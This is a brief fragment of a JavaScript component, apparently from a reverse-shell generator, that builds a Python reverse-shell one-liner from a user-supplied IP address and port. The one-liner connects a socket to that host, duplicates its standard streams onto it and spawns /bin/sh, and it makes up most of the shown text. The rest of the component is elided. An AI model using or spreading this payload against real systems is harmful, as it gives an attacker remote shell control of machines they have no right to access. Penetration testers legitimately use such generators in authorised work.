...
export default (props) => {
	...
	const python_rshell = `python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("${values.ip}",int("${values.port}")))[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`;
